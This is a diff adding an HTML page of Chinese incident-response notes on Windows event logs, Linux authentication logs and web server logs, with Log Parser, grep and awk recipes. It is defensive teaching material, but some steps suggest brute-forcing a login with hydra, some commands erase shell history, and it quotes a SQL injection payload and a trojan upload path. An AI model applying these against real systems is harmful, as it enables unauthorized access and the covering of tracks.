+<div id="outline-container-h:d84fa5fc-07c9-4ac3-82be-916dde99148a" class="outline-4">
+<h4 id="h:d84fa5fc-07c9-4ac3-82be-916dde99148a"><a href="#h:d84fa5fc-07c9-4ac3-82be-916dde99148a">事件日志分析</a></h4>
+<div class="outline-text-4" id="text-h:d84fa5fc-07c9-4ac3-82be-916dde99148a">
+<p>
+对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：
+</p>
+
+<table>
+
+
+<colgroup>
+<col  class="org-right">
+
+<col  class="org-left">
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-right">事件ID</th>
+<th scope="col" class="org-left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-right">4624</td>
+<td class="org-left">登录成功</td>
+</tr>
+
+<tr>
+<td class="org-right">4625</td>
+<td class="org-left">登录失败</td>
+</tr>
+
+<tr>
+<td class="org-right">4634</td>
+<td class="org-left">注销成功</td>
+</tr>
+
+<tr>
+<td class="org-right">4647</td>
+<td class="org-left">用户启动的注销</td>
+</tr>
+
+<tr>
+<td class="org-right">4672</td>
+<td class="org-left">使用超级用户（如管理员）进行登录</td>
+</tr>
+
+<tr>
+<td class="org-right">4720</td>
+<td class="org-left">创建用户</td>
+</tr>
+</tbody>
+</table>
+
+<p>
+案例：暴力破解排查
+</p>
+
+<ol class="org-ol">
+<li>在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”；</li>
+<li>在事件查看器中，单击“安全”，查看安全日志；</li>
+<li><p>
+在安全日志右侧操作中，点击“筛选当前日志”，输入事件ID进行筛选。
+</p>
+
+<p>
+输入事件ID：4625进行日志筛选，发现事件ID：4625，假如事件数是175904，即代表用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力破解。
+</p></li>
+
+<li>提前开启远程连接：
+<ul class="org-ul">
+<li>windows 2008 开始菜单&#x2013;&gt;计算机右键属性&#x2013;&gt;远程设置&#x2013;&gt;选择"允许运行任意版本远程桌面的计算机连接"</li>
+</ul></li>
+
+<li>然后使用爆破工具爆破，如
+<ol class="org-ol">
+<li><a href="https://github.com/vanhauser-thc/thc-hydra">hydra</a></li>
+<li>超级弱口令工具</li>
+</ol></li>
+</ol>
+</div>
+</div>
+<div id="outline-container-h:1082091b-d219-4164-beed-333c51aa58dc" class="outline-4">
+<h4 id="h:1082091b-d219-4164-beed-333c51aa58dc"><a href="#h:1082091b-d219-4164-beed-333c51aa58dc">日志分析工具</a></h4>
+<div class="outline-text-4" id="text-h:1082091b-d219-4164-beed-333c51aa58dc">
+</div>
+<div id="outline-container-h:96ad6e3b-e163-4d5e-84e8-542eda403c90" class="outline-5">
+<h5 id="h:96ad6e3b-e163-4d5e-84e8-542eda403c90"><a href="#h:96ad6e3b-e163-4d5e-84e8-542eda403c90">Log Parser</a></h5>
+<div class="outline-text-5" id="text-h:96ad6e3b-e163-4d5e-84e8-542eda403c90">
+<p>
+Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。
+</p>
+
+<ul class="org-ul">
+<li>Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></li>
+<li>Log Parser 使用示例：<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></li>
+</ul>
+
+<p>
+<b>基本查询结构</b>
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">Logparser.exe &#8211;i:EVT &#8211;o:DATAGRID <span class="org-string">"SELECT * FROM c:\xx.evtx"</span>
+</pre>
+</div>
+
+<p>
+<b>使用Log Parser分析日志</b>
+</p>
+
+<p>
+1、查询登录成功的事件
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&#30331;&#24405;&#25104;&#21151;&#30340;&#25152;&#26377;&#20107;&#20214;
+LogParser.exe -i:EVT &#8211;o:DATAGRID <span class="org-string">"SELECT * FROM c:\security.evtx where EventID=4624"</span>
+
+&#25351;&#23450;&#30331;&#24405;&#26102;&#38388;&#33539;&#22260;&#30340;&#20107;&#20214;&#65306;
+LogParser.exe -i:EVT &#8211;o:DATAGRID <span class="org-string">"SELECT * FROM c:\Security.evtx where TimeGenerated&gt;'2022-11-05 00:00:00' and TimeGenerated&lt;'2022-11-06 00:00:00' and EventID=4624"</span>
+
+&#25552;&#21462;&#30331;&#24405;&#25104;&#21151;&#30340;&#29992;&#25143;&#21517;&#21644;IP&#65306;
+LogParser.exe -i:EVT &#8211;o:DATAGRID <span class="org-string">"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\security.evtx where EventID=4624"</span>
+</pre>
+</div>
+
+<p>
+2、查询登录失败的事件
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#30331;&#24405;&#22833;&#36133;&#30340;&#25152;&#26377;&#20107;&#20214;&#65306;
+LogParser.exe -i:EVT &#8211;o:DATAGRID <span class="org-string">"SELECT * FROM c:\security.evtx where EventID=4625"</span>
+
+&#25552;&#21462;&#30331;&#24405;&#22833;&#36133;&#29992;&#25143;&#21517;&#36827;&#34892;&#32858;&#21512;&#32479;&#35745;&#65306; LogParser.exe -i:EVT <span class="org-string">"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\security.evtx where EventID=4625 GROUP BY Message"</span>
+</pre>
+</div>
+
+<p>
+3、系统历史开关机记录
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">LogParser.exe -i:EVT &#8211;o:DATAGRID <span class="org-string">"SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006"</span>
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:a5f29dc0-75c8-4f23-bbdd-fc7654bafc65" class="outline-5">
+<h5 id="h:a5f29dc0-75c8-4f23-bbdd-fc7654bafc65"><a href="#h:a5f29dc0-75c8-4f23-bbdd-fc7654bafc65">LogParser Lizard</a></h5>
+<div class="outline-text-5" id="text-h:a5f29dc0-75c8-4f23-bbdd-fc7654bafc65">
+<p>
+对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。
+</p>
+
+<p>
+下载地址：<a href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a>
+</p>
+
+<p>
+依赖包：Microsoft .NET Framework 4.5，下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a>
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-h:30d1ca31-a688-453a-bded-78a4bd92d239" class="outline-4">
+<h4 id="h:30d1ca31-a688-453a-bded-78a4bd92d239"><a href="#h:30d1ca31-a688-453a-bded-78a4bd92d239">充内容</a></h4>
+<div class="outline-text-4" id="text-h:30d1ca31-a688-453a-bded-78a4bd92d239">
+<p>
+Windows日志分析参考：<a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a>
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-h:76b03265-0d66-46bf-8179-5b57aaad24fc" class="outline-3">
+<h3 id="h:76b03265-0d66-46bf-8179-5b57aaad24fc"><a href="#h:76b03265-0d66-46bf-8179-5b57aaad24fc">Linux日志分析</a></h3>
+<div class="outline-text-3" id="text-h:76b03265-0d66-46bf-8179-5b57aaad24fc">
+<p>
+<b>使用环境：CentOS</b>
+</p>
+</div>
+<div id="outline-container-h:1078246b-c584-46c4-877b-b70783565d45" class="outline-4">
+<h4 id="h:1078246b-c584-46c4-877b-b70783565d45"><a href="#h:1078246b-c584-46c4-877b-b70783565d45">日志简介</a></h4>
+<div class="outline-text-4" id="text-h:1078246b-c584-46c4-877b-b70783565d45">
+<p>
+日志默认存放位置：/var/log/
+查看日志配置情况：more /etc/rsyslog.conf
+</p>
+
+<p>
+日志文件
+</p>
+<ul class="org-ul">
+<li>/var/log/secure：系统安全日志，文本格式，应周期性分析</li>
+<li>/var/log/btmp：当前系统上，用户的失败尝试登录相关的日志信息，二进制格式，lastb命令进行查看</li>
+<li>/var/log/wtmp 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。二进制文件，使用last命令来查看</li>
+<li>/var/log/lastlog:每一个用户最近一次的登录信息，二进制格式，lastlog命令可以查看</li>
+<li>/var/log/utmp 记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w，who，users等命令来查询</li>
+<li>/var/log/dmesg：CentOS7之前版本系统引导过程中的日志信息，文本格式，开机后的硬件变化将不再记录
+<ul class="org-ul">
+<li>专用命令dmesg查看，可持续记录硬件变化的情况</li>
+</ul></li>
+<li>/var/log/boot.log 系统服务启动的相关信息，文本格式</li>
+<li>/var/log/message 记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</li>
+<li>/var/log/cron 记录了系统定时任务相关的日志</li>
+<li>/var/log/cups 记录打印信息的日志</li>
+<li>/var/log/mailog 记录邮件信息</li>
+</ul>
+
+<p>
+比较重要的几个日志：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&#30331;&#24405;&#22833;&#36133;&#35760;&#24405;&#65306;/var/log/btmp
+&#26368;&#21518;&#19968;&#27425;&#30331;&#24405;&#65306;/var/log/lastlog
+&#30331;&#24405;&#25104;&#21151;&#35760;&#24405;: /var/log/wtmp
+&#30331;&#24405;&#26085;&#24535;&#35760;&#24405;&#65306;/var/log/secure
+&#30446;&#21069;&#30331;&#24405;&#29992;&#25143;&#20449;&#24687;&#65306;/var/run/utmp
+&#21382;&#21490;&#21629;&#20196;&#35760;&#24405;&#65306;history
+&#20165;&#28165;&#29702;&#24403;&#21069;&#29992;&#25143;&#30340;&#21382;&#21490;&#21629;&#20196;&#65306; history -c
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:e1cd4961-0b47-4a15-a250-0c8172c74a46" class="outline-4">
+<h4 id="h:e1cd4961-0b47-4a15-a250-0c8172c74a46"><a href="#h:e1cd4961-0b47-4a15-a250-0c8172c74a46">日志分析技巧</a></h4>
+<div class="outline-text-4" id="text-h:e1cd4961-0b47-4a15-a250-0c8172c74a46">
+</div>
+<div id="outline-container-h:64e781d4-dccd-4720-82ed-78a3723aa0f4" class="outline-5">
+<h5 id="h:64e781d4-dccd-4720-82ed-78a3723aa0f4"><a href="#h:64e781d4-dccd-4720-82ed-78a3723aa0f4">常用的shell命令</a></h5>
+<div class="outline-text-5" id="text-h:64e781d4-dccd-4720-82ed-78a3723aa0f4">
+<p>
+Linux下常用的shell命令如：find、grep 、egrep、awk、sed
+</p>
+
+<p>
+1、grep显示前后几行信息
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&#26631;&#20934;unix/linux&#19979;&#30340;grep&#36890;&#36807;&#19979;&#38754;&#21442;&#25968;&#25511;&#21046;&#19978;&#19979;&#25991;&#65306;
+grep -C 5 foo file &#26174;&#31034;file&#25991;&#20214;&#37324;&#21305;&#37197;foo&#23383;&#20018;&#37027;&#34892;&#20197;&#21450;&#19978;&#19979;5&#34892;
+grep -B 5 foo file &#26174;&#31034;foo&#21450;&#21069;5&#34892;
+grep -A 5 foo file &#26174;&#31034;foo&#21450;&#21518;5&#34892;
+&#26597;&#30475;grep&#29256;&#26412;&#21495;&#30340;&#26041;&#27861;&#26159;&#65306;grep -V
+</pre>
+</div>
+
+<p>
+2、grep 查找含有某字符串的所有文件
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">grep -rn <span class="org-string">"hello,world!"</span> *
+
+* &#34920;&#31034;&#24403;&#21069;&#30446;&#24405;&#25152;&#26377;&#25991;&#20214;&#65292;&#20063;&#21487;&#20197;&#26159;&#26576;&#20010;&#25991;&#20214;&#21517;
+-r &#26159;&#36882;&#24402;&#26597;&#25214;
+-n &#26159;&#26174;&#31034;&#34892;&#21495;
+-R &#26597;&#25214;&#25152;&#26377;&#25991;&#20214;&#21253;&#21547;&#23376;&#30446;&#24405;
+-i &#24573;&#30053;&#22823;&#23567;&#20889;
+</pre>
+</div>
+
+<p>
+3、显示一个文件的某几行
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">cat input_file | tail -n +1000 | head -n 2000 <span class="org-comment-delimiter">#</span><span class="org-comment">&#20174;&#31532;1000&#34892;&#24320;&#22987;&#65292;&#26174;&#31034;2000&#34892;&#12290;&#21363;&#26174;&#31034;1000~2999&#34892;</span>
+</pre>
+</div>
+
+<p>
+4、查找命令
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">find /etc -name init //&#22312;&#30446;&#24405;/etc&#20013;&#26597;&#25214;&#25991;&#20214;init
+</pre>
+</div>
+
+<p>
+5、只显示/etc/passwd的账户
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">cat /etc/passwd | awk -F <span class="org-string">':'</span> <span class="org-string">'{print $1}'</span> //awk -F&#25351;&#23450;&#22495;&#20998;&#38548;&#31526;&#20026;<span class="org-string">':'</span>&#65292;&#23558;&#35760;&#24405;&#25353;&#25351;&#23450;&#30340;&#22495;&#20998;&#38548;&#31526;&#21010;&#20998;&#22495;&#65292;&#22635;&#20805;&#22495;&#65292;$<span class="org-variable-name">0</span>&#21017;&#34920;&#31034;&#25152;&#26377;&#22495;,$<span class="org-variable-name">1</span>&#34920;&#31034;&#31532;&#19968;&#20010; &#22495;,$<span class="org-variable-name">n&#34920;&#31034;&#31532;n&#20010;&#22495;</span>&#12290;
+</pre>
+</div>
+
+<p>
+6、删除历史操作记录
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">sed -i <span class="org-string">'153,$d'</span> .bash_history //&#21024;&#38500;&#21382;&#21490;&#25805;&#20316;&#35760;&#24405;&#65292;&#21482;&#20445;&#30041;&#21069;153&#34892;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:9b00aa5f-61f5-4eaa-bda8-7ed74b25805c" class="outline-5">
+<h5 id="h:9b00aa5f-61f5-4eaa-bda8-7ed74b25805c"><a href="#h:9b00aa5f-61f5-4eaa-bda8-7ed74b25805c">日志分析技巧</a></h5>
+<div class="outline-text-5" id="text-h:9b00aa5f-61f5-4eaa-bda8-7ed74b25805c">
+<p>
+1、/var/log/secure
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">1&#12289;&#23450;&#20301;&#26377;&#22810;&#23569;IP&#22312;&#29190;&#30772;&#20027;&#26426;&#30340;root&#36134;&#21495;&#65306;
+grep <span class="org-string">"Failed password for root"</span> /var/log/secure | awk <span class="org-string">'{print $11}'</span> | sort | uniq -c | sort -nr | more
+
+2&#12289;&#23450;&#20301;&#26377;&#21738;&#20123;IP&#22312;&#29190;&#30772;&#65306;
+grep <span class="org-string">"Failed password"</span> /var/log/secure | grep -E -o <span class="org-string">"(25[0-5]|2[0-4][0-9]|[01]? [0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]? [0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</span>|uniq -c
+
+3&#12289;&#29190;&#30772;&#29992;&#25143;&#21517;&#23383;&#20856;&#26159;&#20160;&#20040;&#65311;
+grep <span class="org-string">"Failed password"</span> /var/log/secure | perl -e <span class="org-string">'while($_=&lt;&gt;){ /for(.*?) from/; print "$1\n";}'</span> | uniq -c|sort -nr
+
+4&#12289;&#30331;&#24405;&#25104;&#21151;&#30340;IP&#26377;&#21738;&#20123;&#65306;
+grep <span class="org-string">"Accepted "</span> /var/log/secure | awk <span class="org-string">'{print $11}'</span> | sort | uniq -c | sort -nr | more
+
+5&#12289;&#30331;&#24405;&#25104;&#21151;&#30340;&#26085;&#26399;&#12289;&#29992;&#25143;&#21517;&#12289;IP&#65306;
+grep <span class="org-string">"Accepted "</span> /var/log/secure | awk <span class="org-string">'{print $1,$2,$3,$9,$11}'</span>
+</pre>
+</div>
+
+<p>
+2、/var/log/yum.log
+软件安装升级卸载日志：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">[root@bogon ~]# more /var/log/yum.log
+Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64
+Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64
+Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64
+Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64
+Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686
+</pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:0f71492b-b173-4475-8bdf-550a089b5a07" class="outline-3">
+<h3 id="h:0f71492b-b173-4475-8bdf-550a089b5a07"><a href="#h:0f71492b-b173-4475-8bdf-550a089b5a07">Web日志分析</a></h3>
+<div class="outline-text-3" id="text-h:0f71492b-b173-4475-8bdf-550a089b5a07">
+<p>
+Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。
+</p>
+
+<p>
+我们来看一条Apache的访问日志：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] <span class="org-string">"GET /login.html HTTP/1.1"</span> 200 786 <span class="org-string">"-"</span> <span class="org-string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"</span>
+</pre>
+</div>
+
+<p>
+通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、使用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。
+</p>
+</div>
+<div id="outline-container-h:7aa654f6-bc7f-4031-85a5-028c11571ea4" class="outline-4">
+<h4 id="h:7aa654f6-bc7f-4031-85a5-028c11571ea4"><a href="#h:7aa654f6-bc7f-4031-85a5-028c11571ea4">日志分析技巧</a></h4>
+<div class="outline-text-4" id="text-h:7aa654f6-bc7f-4031-85a5-028c11571ea4">
+<p>
+在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。
+</p>
+
+<p>
+1、确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。
+</p>
+
+<p>
+举例：SQL注入攻击，在web日志能看到什么？
+</p>
+<ul class="org-ul">
+<li>GET方法：在web日志中，通过接口地址我就可以看到注入的payload，比如1‘ and 1=1 #</li>
+<li>POST方法：通过大量的访问记录，找到攻击的接口地址，根据响应码判断是否攻击成功，以及确认该接口是否与数据库产生交互。</li>
+</ul>
+
+<p>
+2、攻击者在入侵网站后，通常会留下后门维持权限，以便再次访问，我们可以找到该文件，并以此为线索来展开分析。
+</p>
+
+<p>
+后门怎么来的？ &#x2013;&gt; 查看web日志，根据后门文件的创建时间去查看前后的日志 &#x2013;&gt; 看看系统登陆日志
+</p>
+
+<p>
+常用分析工具：
+</p>
+<ul class="org-ul">
+<li>Window下，推荐用 EmEditor/Notepad++ 进行日志分析，支持大文本，搜索效率不错。</li>
+<li>Linux下，使用Shell命令组合查询分析。一般结合grep、awk等命令等实现常用的日志分析统计技巧。</li>
+</ul>
+
+<p>
+Apache日志分析技巧：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">1&#12289;&#21015;&#20986;&#24403;&#22825;&#35775;&#38382;&#27425;&#25968;&#26368;&#22810;&#30340;IP&#21629;&#20196;&#65306;
+cut -d- -f 1 log_file|uniq -c | sort -rn | head -20
+
+2&#12289;&#26597;&#30475;&#24403;&#22825;&#26377;&#22810;&#23569;&#20010;IP&#35775;&#38382;&#65306;
+awk <span class="org-string">'{print $1}'</span> log_file|sort | uniq | wc -l
+
+3&#12289;&#26597;&#30475;&#26576;&#19968;&#20010;&#39029;&#38754;&#34987;&#35775;&#38382;&#30340;&#27425;&#25968;&#65306;
+grep <span class="org-string">"/index.php"</span> log_file | wc -l
+
+4&#12289;&#26597;&#30475;&#27599;&#19968;&#20010;IP&#35775;&#38382;&#20102;&#22810;&#23569;&#20010;&#39029;&#38754;&#65306;
+awk <span class="org-string">'{++S[$1]} END {for (a in S) print a,S[a]}'</span> log_file
+
+5&#12289;&#23558;&#27599;&#20010;IP&#35775;&#38382;&#30340;&#39029;&#38754;&#25968;&#36827;&#34892;&#20174;&#23567;&#21040;&#22823;&#25490;&#24207;&#65306;
+awk <span class="org-string">'{++S[$1]} END {for (a in S) print S[a],a}'</span> log_file | sort -n
+
+6&#12289;&#26597;&#30475;&#26576;&#19968;&#20010;IP&#35775;&#38382;&#20102;&#21738;&#20123;&#39029;&#38754;&#65306;
+grep ^IP log_file| awk <span class="org-string">'{print $1,$7}'</span>
+
+7&#12289;&#21435;&#25481;&#25628;&#32034;&#24341;&#25806;&#32479;&#35745;&#24403;&#22825;&#30340;&#39029;&#38754;&#65306;
+awk <span class="org-string">'{print $12,$1}'</span> log_file | grep ^<span class="org-string">\"</span>Mozilla | awk <span class="org-string">'{print $2}'</span> | sort | uniq | wc -l
+
+8&#12289;&#26597;&#30475;2022&#24180;6&#26376;21&#26085;14&#26102;&#36825;&#19968;&#20010;&#23567;&#26102;&#20869;&#26377;&#22810;&#23569;IP&#35775;&#38382;:
+awk <span class="org-string">'{print $4,$1}'</span> log_file | grep 21/Jun/2022:14 | awk <span class="org-string">'{print $2}'</span>| sort | uniq | wc -l
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:af9f46d6-c15d-465d-a977-14dfbc86d5db" class="outline-4">
+<h4 id="h:af9f46d6-c15d-465d-a977-14dfbc86d5db"><a href="#h:af9f46d6-c15d-465d-a977-14dfbc86d5db">日志分析案例</a></h4>
+<div class="outline-text-4" id="text-h:af9f46d6-c15d-465d-a977-14dfbc86d5db">
+<p>
+实例：通过nginx代理转发到某内网服务器，内网服务器某站点目录下被上传了多个图片木马，虽然IIS下不能解析，但还是想找出谁通过什么路径上传的。
+</p>
+
+<p>
+在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的IP（即nginx），并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？
+</p>
+
+<p>
+这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。
+</p>
+
+<p>
+1、定位攻击源
+</p>
+
+<p>
+首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">more u_ex180408.log | grep <span class="org-string">"asp;."</span>
+
+[TIME] GET  /up/dj/2012.asp;.jgp  - 815 - 11.8.88.91 Mozilla/4.0+ (compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.N ET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)
+</pre>
+</div>
+
+<p>
+浏览器指纹：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">Mozilla/4.0+ (compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.N ET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)
+</pre>
+</div>
+
+<p>
+2、搜索相关日志记录
+</p>
+
+<p>
+通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。
+</p>
+
+
+<figure id="org61ce7d7">
+<img style="aspect-ratio:2368/972" decoding="async" loading="lazy" src="./images/img_20230814_170909.webp" alt="img_20230814_170909.webp" width="50%">
+
+</figure>
+
+<p>
+3、对找到的访问日志进行解读，攻击者大致的访问路径如下
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">A&#12289;&#25915;&#20987;&#32773;&#35775;&#38382;&#39318;&#39029;&#21644;&#30331;&#24405;&#39029;
+B&#12289;&#25915;&#20987;&#32773;&#35775;&#38382;MsgSjlb.aspx&#21644;MsgSend.aspx
+C&#12289;&#25915;&#20987;&#32773;&#35775;&#38382;Xzuser.aspx
+D&#12289;&#25915;&#20987;&#32773;&#22810;&#27425;POST&#65288;&#24576;&#30097;&#36890;&#36807;&#36825;&#20010;&#39029;&#38754;&#19978;&#20256;&#27169;&#22359;&#32570;&#38519;&#65289;
+E&#12289;&#25915;&#20987;&#32773;&#35775;&#38382;&#20102;&#22270;&#29255;&#26408;&#39532;
+</pre>
+</div>
+
+<p>
+打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。
+</p>
+</div>
+</div>
+<div id="outline-container-h:b5aaf9c0-eef5-400d-837b-f89c6bec5802" class="outline-4">
+<h4 id="h:b5aaf9c0-eef5-400d-837b-f89c6bec5802"><a href="#h:b5aaf9c0-eef5-400d-837b-f89c6bec5802">日志统计分析技巧</a></h4>
+<div class="outline-text-4" id="text-h:b5aaf9c0-eef5-400d-837b-f89c6bec5802">
+<p>
+命令不是重点，要能根据统计结果分析出有用的信息。
+</p>
+
+<p>
+统计爬虫：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">grep -E <span class="org-string">'Googlebot|Baiduspider'</span> /www/logs/access.2019-02-23.log | awk <span class="org-string">'{ print $1 }'</span> | sort | uniq
+</pre>
+</div>
+
+<p>
+统计浏览器：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | grep -v -E <span class="org-string">'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon'</span> | sort | uniq -c | sort -r -n | head -n 100
+</pre>
+</div>
+
+<p>
+IP 统计：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">grep <span class="org-string">'23/May/2019'</span> /www/logs/access.2019-02-23.log | awk <span class="org-string">'{print $1}'</span> | awk -F<span class="org-string">'.'</span> <span class="org-string">'{print $1"."$2"."$3"."$4}'</span> | sort | uniq -c | sort -r -n | head -n 3
+    2206 219.136.134.13
+    1497 182.34.15.248
+    1431 211.140.143.100 
+</pre>
+</div>
+
+<p>
+统计网段：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span class="org-string">'{print $1}'</span> | awk -F<span class="org-string">'.'</span> <span class="org-string">'{print $1"."$2"."$3".0"}'</span> | sort | uniq -c | sort -r -n | head -n 200
+</pre>
+</div>
+
+<p>
+统计域名：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span class="org-string">'{print $2}'</span> | sort | uniq -c | sort - rn | more
+</pre>
+</div>
+
+<p>
+HTTP Status：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span class="org-string">'{print $9}'</span> | sort | uniq -c | sort - rn | more
+    5056585 304
+    1125579 200
+    7602 400
+    5 301
+</pre>
+</div>
+
+<p>
+URL统计：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span class="org-string">'{print $7}'</span> | sort | uniq -c | sort - rn | more
+</pre>
+</div>
+
+<p>
+文件流量统计：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span class="org-string">'{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'</span> | sort -rn | more
+
+grep <span class="org-string">' 200 '</span> /www/logs/access.2019-02-23.log | awk <span class="org-string">'{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'</span> | sort -rn | more
+</pre>
+</div>
+
+<p>
+URL访问量统计：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span class="org-string">'{print $7}'</span> | egrep <span class="org-string">'\?|&amp;'</span> | sort | uniq -c | sort -rn | more
+</pre>
+</div>
+
+<p>
+脚本运行速度：查出运行速度最慢的脚本
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">grep -v 0$ /www/logs/access.2019-02-23.log | awk -F <span class="org-string">'\" '</span> <span class="org-string">'{print $4" " $1}'</span> web.log | awk <span class="org-string">'{print $1" "$8}'</span> | sort -n -k 1 -r | uniq &gt; /tmp/slow_url.txt
+</pre>
+</div>
+
+<p>
+IP，URL 抽取：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter"># </span><span class="org-comment">tail -f /www/logs/access.2019-02-23.log | grep '/test.html' | awk '{print $1" "$7}'</span>
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:9401981a-7cf6-458a-b060-bfe7149ffbf3" class="outline-3">
+<h3 id="h:9401981a-7cf6-458a-b060-bfe7149ffbf3"><a href="#h:9401981a-7cf6-458a-b060-bfe7149ffbf3">Mysql日志分析</a></h3>
